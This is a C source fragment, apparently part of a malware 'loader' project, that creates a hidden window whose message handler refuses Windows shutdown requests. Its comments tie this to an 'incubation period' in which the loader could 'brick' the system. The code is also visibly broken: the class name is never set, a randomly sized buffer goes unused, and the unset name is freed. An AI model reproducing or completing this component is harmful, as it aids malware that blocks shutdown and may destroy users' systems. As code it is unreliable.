#include "pch.h"
#include "_rift.h"

// DummyWindow Proc that monitors Windows' activity (shuting down etc)
// this will be used in order to prevent the loader from accidentally
// bricking the system in the Incubation period

LRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg) {
	case WM_CREATE:
		break;
	case WM_QUERYENDSESSION:
		return FALSE;
		break;
	case WM_ENDSESSION:
		;
	}

	return DefWindowProcW(hWnd, uMsg, wParam, lParam);
}

DWORD WINAPI thWindowThread(
	_In_ LPVOID lParam
) {
	WNDCLASSEXW wc;
	ZeroMemory(&wc, sizeof(wc));
	wc.cbSize = sizeof(wc);
	wc.lpfnWndProc = WndProc;

	UINT8 nLength = fnURID(8, 255);
	PCWSTR pName = AllocMemory(nLength, 0);

//	wc.lpszClassName = ;

	RegisterClassExW(&wc);

	HWND hWnd = CreateWindowExW(0, wc.lpszClassName, wc.lpszClassName, WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, 0, 0);
	if (hWnd) {
		MSG mMsg; BOOL bRet;
		while ((bRet = GetMessageW(&mMsg, NULL, 0, 0)) != 0) {
			if (bRet == -1) {
				return 0;
			}
			else {
				TranslateMessage(&mMsg);
				DispatchMessageW(&mMsg);
			}
		}
	}

	FreeMemory(wc.lpszClassName);
	return TRUE;
}